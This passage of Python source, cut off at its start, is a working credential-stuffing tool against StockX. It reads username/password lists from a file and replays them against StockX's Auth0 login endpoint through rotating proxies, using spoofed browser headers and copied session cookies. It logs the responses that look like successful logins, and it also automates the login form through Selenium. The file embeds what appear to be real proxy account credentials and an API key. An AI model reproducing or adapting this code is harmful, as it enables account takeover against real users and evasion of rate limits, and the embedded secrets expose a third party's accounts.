            ip = ip.text.strip()
            print(ip)
            url = 'https://accounts.stockx.com/usernamepassword/login'
            headers = {'Host': 'accounts.stockx.com', 'Connection': 'keep-alive', 'Content-Length': '530',
                       'sec-ch-ua': '"Chromium";v="106", "Microsoft Edge";v="106", "Not;A=Brand";v="99"',
                       'Content-Type': 'application/json',
                       'Auth0-Client': 'eyJuYW1lIjoiYXV0aDAuanMtdWxwIiwidmVyc2lvbiI6IjkuMTAuNCJ9',
                       'sec-ch-ua-mobile': '?0',
                       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42',
                       'sec-ch-ua-platform': '"Windows"', 'Accept': '*/*', 'Origin': 'https://accounts.stockx.com',
                       'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Dest': 'empty',
                       'Referer': 'https://accounts.stockx.com/login?state=hKFo2SBsLVlTbVR2TDMxcTBZZ3RDcDI2UWVTc1B3cklnenQwc6FupWxvZ2luo3RpZNkgd0hfMDZiQWlIRVJNd1V4UGR3T2lUdjd6Sld2U2RFV0mjY2lk2SBPVnhydDRWSnFUeDdMSVVLZDY2MVcwRHVWTXBjRkJ5RA&client=OVxrt4VJqTx7LIUKd661W0DuVMpcFByD&protocol=oauth2&prompt=login&audience=gateway.stockx.com&auth0Client=eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xOS4xIn0%3D&connection=production&lng=en&redirect_uri=https%3A%2F%2Fstockx.com%2Fcallback%3Fpath%3D%2F&response_mode=query&response_type=code&scope=openid%20profile&stockx-currency=USD&stockx-default-tab=login&stockx-is-gdpr=false&stockx-language=en-us&stockx-session-id=ebc6c543-b9c4-4b83-aed3-b646eb34f787&stockx-url=https%3A%2F%2Fstockx.com&stockx-user-agent=Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F106.0.0.0%20Safari%2F537.36%20Edg%2F106.0.1370.42&ui_locales=en',
                       'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'zh-CN,zh;q=0.9'}
            cookies = {'_csrf': 'dCcje3tzTbfOfyS6nz6LGouE',
                       '__cf_bm': '.2UKnQR9NgFVSZMmoY18pgnZWJnlkC5gnCKbFG1QiBA-1665816436-0-AXZkD+jOUDchiejAOVWvHJouyM3JjMpJ7VqLjOFmGFR5QuQhxgxNuE3nrLhOn1DvfX5Puuxy3RAynBXqvrzfClI',
                       'pxcts': '37a26909-4c55-11ed-a2d4-766e50474455',
                       '_pxvid': '37a25c7c-4c55-11ed-a2d4-766e50474455',
                       'forterToken': '04264e16539e4132a52701bcc4f32323_1665816438938__UDF43_13ck',
                       '__pxvid': '37c9496c-4c55-11ed-8233-0242ac120002',
                       'ajs_anonymous_id': 'f80a2073-8b49-4734-b427-134e1ce884f0',
                       '_gcl_au': '1.1.1859648209.1665816440', '_clck': 'uiq1zh|1|f5q|0',
                       'rbuid': 'rbos-345454e7-5b8f-45ef-a670-311db306c0c3',
                       '_px3': '1860464ddb59bc2be3221f0aec398a7a9a1fee589fa8048fd63f8891bf6700c8:ww3m4axNTP6R569SG9adUAFYt0cZ3YLnLqLyN8d/T+gyk57bGNGwyz9/PSDQwICqX/uDpMxQM0vyg6PJGLFfpg',
                       'did': 's%3Av0%3A4c094340-4c55-11ed-9d04-790e9c2b5e68.art%2B5kxLf5axO6iCXtaBATVSGTjlmjH%2BttPNzI0ZPdY',
                       'auth0': 's%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQF_Wd4a0aQEqQhsgd33RwbX9Hg779jlQqFxR23EzJKmRjEODzTesh0z540N8JvLwftRA66CnhTa0lotvn33dbtemY29va2llg6dleHBpcmVz1_8NHO8AY05MG65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.zd9SKBMlN5eZBLvBaKfXFYEogGKmc4pz79WsvpHuKFg',
                       'did_compat': 's%3Av0%3A4c094340-4c55-11ed-9d04-790e9c2b5e68.art%2B5kxLf5axO6iCXtaBATVSGTjlmjH%2BttPNzI0ZPdY',
                       'auth0_compat': 's%3Av1.gadzZXNzaW9ugqZoYW5kbGXEQF_Wd4a0aQEqQhsgd33RwbX9Hg779jlQqFxR23EzJKmRjEODzTesh0z540N8JvLwftRA66CnhTa0lotvn33dbtemY29va2llg6dleHBpcmVz1_8NHO8AY05MG65vcmlnaW5hbE1heEFnZc4PcxQAqHNhbWVTaXRlpG5vbmU.zd9SKBMlN5eZBLvBaKfXFYEogGKmc4pz79WsvpHuKFg',
                       '_clsk': '1d684tz|1665816480444|2|0|l.clarity.ms/collect', 'language_code': 'en',
                       '_uetsid': '372d7f304c5511edadc3775920b54518', '_uetvid': '372dbc104c5511ed9f86ef2042a4d88c',
                       '_pxde': 'eaa382f6d2bd416caf95a0cbe51755fbbd99e4b6b0cb0c20fa87248c4a286f9c:eyJ0aW1lc3RhbXAiOjE2NjU4MTY1MjYxNDMsImZfa2IiOjB9',
                       'QuantumMetricSessionID': '1de20627dfab78e60796c899dfd6f8b7',
                       'QuantumMetricUserID': '940372d5ff5606c5017355a57683a23c', '_dd_s': 'logs'}
            data = '{"client_id":"OVxrt4VJqTx7LIUKd661W0DuVMpcFByD","redirect_uri":"https://stockx.com/callback?path=/","tenant":"stockx-prod","response_type":"code","scope":"openid profile","audience":"gateway.stockx.com","_csrf":"Hr64JECi-eh3qbkrmluW8r-UOS9mstJPLYik","state":"hKFo2SBsLVlTbVR2TDMxcTBZZ3RDcDI2UWVTc1B3cklnenQwc6FupWxvZ2luo3RpZNkgd0hfMDZiQWlIRVJNd1V4UGR3T2lUdjd6Sld2U2RFV0mjY2lk2SBPVnhydDRWSnFUeDdMSVVLZDY2MVcwRHVWTXBjRkJ5RA","_intstate":"deprecated","username":"' + \
                   txt2[1] + '","password":"' + txt2[2] + '","connection":"production"}'

            # html = requests.post(url, headers=headers, verify=False, cookies=cookies, data=data)
            # urls = "http://17680492987:17680492987@"+ip
            html = requests.post(url, headers=headers, verify=False, cookies=cookies, data=data,
                                 proxies={'HTTPS': 'HTTPS://' + ip})
            try:
                thes = json.loads(html.text)
                print(line)
                if thes['statusCode'] != 400 and thes['statusCode'] != 429:  # 429
                    print(html.text)
                    # print(html.text.decode(''))
                    f.writelines(line, html.text)
                    f.flush()
            except:
                continue


# 用于快速设置 profile 的代理信息的方法
def get_firefox_profile_with_proxy_set(profile, proxy_host=None):
    if proxy_host:
        # 有参数就取代理，没有就读文本随机
        proxy_list = proxy_host.split(':')
        agent_ip = proxy_list[0]
        agent_port = proxy_list[1]
    else:
        with open(sys.path[0] + '/ip', 'r', encoding='utf-8') as f:
            read_data = f.read().splitlines()
            if read_data:
                proxy_host = random.choice(read_data)
                proxy_list = proxy_host.split(':')
                agent_ip = proxy_list[0]
                agent_port = proxy_list[1]
    # profile.set_preference('network.proxy.type', 1)
    # profile.set_preference('signon.autologin.proxy', 'true')
    # profile.set_preference('network.proxy.share_proxy_settings', 'false')
    # profile.set_preference('network.automatic-ntlm-auth.allow-proxies', 'false')
    # profile.set_preference('network.auth.use-sspi', 'false')

    profile.set_preference('network.proxy.type', 1)  # 使用代理
    profile.set_preference('network.proxy.share_proxy_settings', True)  # 所有协议公用一种代理配置
    profile.set_preference('network.proxy.http', agent_ip)
    profile.set_preference('network.proxy.http_port', int(agent_port))
    profile.set_preference('permissions.default.image', 2)  # 无图模式
    profile.set_preference('network.proxy.ssl', agent_ip)
    profile.set_preference('network.proxy.ssl_port', int(agent_port))
    # 对于localhost的不用代理，这里必须要配置，否则无法和 webdriver 通讯
    profile.set_preference('network.proxy.no_proxies_on', 'localhost,127.0.0.1')
    profile.set_preference('network.http.use-cache', False)

    profile.update_preferences()

    proxy = Proxy({
        'proxyType': ProxyType.MANUAL,
        'httpProxy': proxy_host,
        'ftpProxy': proxy_host,
        'sslProxy': proxy_host,
        'noProxy': '',
        'socksUsername': 'customer-b01971',
        'socksPassword': '63950768',
        'httpUsername': 'customer-b01971',
        'httpPassword': '63950768'
    })
    return profile, proxy


# 读文件切割登录网页重发
def open_web():
    with open(sys.path[0] + '/z.txt', 'r', encoding='utf-8') as f:
        read_data = f.readlines()
        for i in range(len(read_data)):
            try:

                line = read_data[i].strip()
                txt2 = line.split("\t")
                # 中国随机ip
                # ip = get_ip()

                # 网络接口取得ip
                # ip = requests.get(
                #     'http://17680492987.user.xiecaiyun.com/api/proxies?action=getText&key=NP4A43A3ED&count=1&word=&rand=true&norepeat=false&detail=false&ltime=0')
                # myProxy = ip.text.strip()

                profile = webdriver.FirefoxProfile()

                profile, proxy = get_firefox_profile_with_proxy_set(profile, proxy_host="proxy.ipipgo.com:31212")
                print("代理", proxy.http_proxy)

                # if user_agent:
                #     profile.set_preference("general.useragent.override", user_agent)
                driver = webdriver.Firefox(firefox_profile=profile, proxy=proxy)
                # driver = webdriver.Firefox(options=chrome_options)
                # time.sleep(1)
                driver.get("https://stockx.com/")
                driver.set_window_size(890, 895)
                driver.find_element(By.CSS_SELECTOR, ".chakra-modal__close-btn").click()
                driver.find_element(By.CSS_SELECTOR, ".css-f9o8up").click()
                driver.find_element(By.ID, "email-login").send_keys(txt2[1])
                driver.find_element(By.ID, "password-login").send_keys(txt2[2])
                driver.find_element(By.ID, "btn-login").click()
                driver.quit()
                # thes = json.loads(html.text)
                print(line)
                if False:  # 429
                    # print(html.text)
                    # print(html.text.decode(''))
                    f.writelines(line, html.text)
                    f.flush()
            except:
                continue


# open_web()
# open_txt2()
# repeats()
open_txt_yzm()
